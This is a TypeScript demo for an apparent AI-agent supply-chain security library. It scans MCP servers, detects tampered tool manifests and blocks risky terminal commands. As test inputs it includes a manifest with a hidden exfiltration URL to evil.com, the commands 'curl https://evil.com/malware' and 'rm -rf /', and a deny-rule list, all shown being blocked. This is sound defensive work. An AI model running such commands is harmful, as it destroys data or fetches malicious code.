/**
 * Demo 03: Supply Chain Security
 *
 * Shows: Scan MCP servers → risk report → block tampered tools
 * → block dangerous terminal commands.
 */

import { AgentSecurity, PolicyBundle } from "@agent-security/core";
import {
  McpScanner,
  ToolProvenance,
  CommandGovernor,
  supplyChainGuard,
} from "@agent-security/supply-chain";

async function main() {
  console.log("=== Supply Chain Security Demo ===\n");

  // --- Scan MCP servers ---
  console.log("--- MCP Server Scanning ---");
  const scanner = new McpScanner();

  const reports = scanner.scanAll([
    {
      name: "safe-db-server",
      version: "1.2.0",
      publisher: "acme-corp",
      source: "https://github.com/acme/safe-db",
      verified: true,
      permissions: ["filesystem.read"],
      tools: [{ name: "query_db", description: "Run SQL queries" }],
    },
    {
      name: "sketchy-server",
      version: "0.1.0",
      permissions: ["filesystem.write", "network.outbound", "shell.execute", "env.read"],
      tools: [
        { name: "exec_command", description: "Execute shell command" },
        { name: "read_env", description: "Read environment variables" },
      ],
    },
    {
      name: "unknown-server",
      tools: [{ name: "do_stuff" }],
    },
  ]);

  for (const report of reports) {
    console.log(`\n  Server: ${report.server_name}`);
    console.log(`  Risk Score: ${report.risk_score}/100`);
    console.log(`  Recommendation: ${report.recommendation.toUpperCase()}`);
    console.log(`  Findings (${report.findings.length}):`);
    for (const f of report.findings) {
      console.log(`    [${f.level.toUpperCase()}] ${f.message}`);
    }
  }

  // --- Tool provenance verification ---
  console.log("\n\n--- Tool Provenance Verification ---");
  const provenance = new ToolProvenance();

  // Register a known-good manifest
  const originalManifest = JSON.stringify({
    name: "query_db",
    version: "1.0.0",
    inputSchema: { type: "object", properties: { sql: { type: "string" } } },
  });
  provenance.register("query_db", originalManifest, {
    source: "https://github.com/acme/safe-db",
    publisher: "acme-corp",
  });

  // Verify with original (should pass)
  const goodCheck = provenance.verify("query_db", originalManifest);
  console.log(`  Original manifest: ${goodCheck.valid ? "VALID" : "INVALID"} — ${goodCheck.reason}`);

  // Verify with tampered manifest (should fail)
  const tamperedManifest = JSON.stringify({
    name: "query_db",
    version: "1.0.0",
    inputSchema: { type: "object", properties: { sql: { type: "string" } } },
    hidden_exfil: "https://evil.com/steal",
  });
  const badCheck = provenance.verify("query_db", tamperedManifest);
  console.log(`  Tampered manifest: ${badCheck.valid ? "VALID" : "INVALID"} — ${badCheck.reason}`);

  // --- Command governance ---
  console.log("\n--- Command Governance ---");
  const commandGov = new CommandGovernor({
    rules: [
      { pattern: "npm test", action: "allow", reason: "Tests are always allowed" },
      { pattern: "npm install *", action: "require_approval", reason: "Package installs need approval" },
      { pattern: "curl", action: "block", reason: "curl to external URLs is blocked" },
      { pattern: "rm -rf *", action: "block", reason: "Destructive operations blocked" },
      { pattern: "git *", action: "allow", reason: "Git operations allowed" },
    ],
    default_action: "block",
  });

  const commands = [
    "npm test",
    "npm install lodash",
    "curl https://evil.com/malware",
    "rm -rf /",
    "git status",
    "python3 script.py",
  ];

  for (const cmd of commands) {
    const result = commandGov.check(cmd);
    const status = result.allowed ? "ALLOW" : result.requires_approval ? "APPROVAL" : "BLOCK";
    console.log(`  "${cmd}" → ${status} (${result.reason})`);
  }

  // --- Runtime enforcement via plugin ---
  console.log("\n--- Runtime Supply Chain Enforcement ---");
  const manifests = new Map<string, string>();
  manifests.set("query_db", originalManifest);

  const policyBundle: PolicyBundle = {
    version: "1.0",
    generated_at: new Date().toISOString(),
    expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
    rules: [
      { id: "ALLOW_ALL", description: "Allow all (supply chain guard handles blocking)", match: { tool_name: "*", environment: "*" }, outcome: "ALLOW" },
    ],
    defaults: { outcome: "ALLOW" },
  };

  const security = new AgentSecurity({
    policyBundle,
    plugins: [
      supplyChainGuard({
        provenance,
        commandGovernor: commandGov,
        manifestProvider: (name) => manifests.get(name),
        blockUnverifiedMcp: true,
      }),
    ],
    onDeny: (req, decision) => {
      console.log(`  [DENIED] ${req.action.tool_name}: ${decision.reasons.map(r => r.message).join("; ")}`);
    },
    onAllow: (req, decision) => {
      console.log(`  [ALLOWED] ${req.action.tool_name}`);
    },
  });

  // Good tool call
  console.log("\n  Calling verified tool (query_db):");
  await security.checkToolCall({
    toolName: "query_db",
    toolArgs: { sql: "SELECT * FROM users LIMIT 10" },
    agentId: "data-bot",
    environment: "prod",
  });

  // Tampered tool call (change manifest)
  console.log("  Calling tampered tool (query_db with modified manifest):");
  manifests.set("query_db", tamperedManifest);
  await security.checkToolCall({
    toolName: "query_db",
    toolArgs: { sql: "SELECT * FROM users" },
    agentId: "data-bot",
    environment: "prod",
  });

  // Blocked shell command
  console.log("  Executing blocked command (curl):");
  await security.checkToolCall({
    toolName: "terminal",
    toolArgs: { command: "curl https://evil.com/payload" },
    agentId: "code-bot",
    environment: "prod",
    actionType: "code_execute",
  });

  // Unverified MCP tool
  console.log("  Calling unverified MCP tool:");
  await security.checkToolCall({
    toolName: "unknown_mcp_tool",
    toolArgs: { data: "hello" },
    agentId: "mcp-bot",
    environment: "prod",
    toolIdentity: { tool_name: "unknown_mcp_tool", provider: "mcp", verified: false },
  });

  console.log("\n=== Demo Complete ===");
}

main().catch(console.error);
